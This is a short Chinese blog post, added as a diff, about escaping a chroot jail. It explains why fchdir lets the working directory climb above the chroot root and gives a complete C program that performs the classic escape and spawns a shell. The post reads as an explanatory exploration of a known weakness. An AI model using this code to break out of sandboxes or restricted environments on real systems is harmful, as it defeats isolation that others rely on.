@@ -1,0 +1,29 @@
+#TITLE: 脱离chroot的枷锁
+#TAGS: unix-like
+
+今天 `#ubuntu-cn@freenode` 中 `Kandu` 提到 `chroot` 限定的根是可以脱离的：`http://www.bpfh.net/simes/computing/chroot-break.html`。
+
+`Kandu` 说，造成这种现象可能的原因是由于使用了 `fchdir`，不能比较目录，只能比较 `inode`。本来改变当前目录时，如果碰到 `cwd` 和 `root` 目录相同则不做变动，但 `cwd` 在 `root` 目录（即 `tempdir`）之上，所以不会碰到相等的情况，于是 `cwd` 能一直往上回溯，直到内核加载时 `root` 的 `/`。
+
+我也尝试写一份：
+
+    #include <fcntl.h>
+    #include <stdlib.h>
+    #include <sys/stat.h>
+    #include <sys/types.h>
+    #include <unistd.h>
+    
+    int main(void)
+    {
+        int fd = open(".", O_RDONLY), i;
+        mkdir("tempdir", 0755);
+        if (fd == -1) return 1;
+        if (chroot("tempdir") == -1) return 1;
+        if (fchdir(fd) == -1) return 1;
+        for (i = 0; i < 1024; i++)
+            chdir("..");
+        if (chroot(".") == -1) return 1;
+        system("sh");
+    }
+
+明当远离，不知所言。
